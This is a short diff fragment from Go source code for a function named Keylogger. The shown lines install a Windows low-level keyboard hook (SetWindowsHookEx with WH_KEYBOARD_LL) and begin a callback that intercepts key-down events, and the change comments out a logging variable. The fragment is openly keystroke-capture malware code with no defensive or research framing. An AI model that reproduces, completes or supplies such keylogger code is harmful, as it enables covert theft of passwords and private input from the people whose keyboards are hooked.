@@ -540,7 +540,7 @@ func Keylogger() {
     CAPS = CAPS & 0x000001
     var CAPS2 uintptr
     var SHIFT uintptr
-    var precLog string = ""
+    //var precLog string = ""
     //var write bool = false
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
        if nCode == 0 && wparam == WM_KEYDOWN {
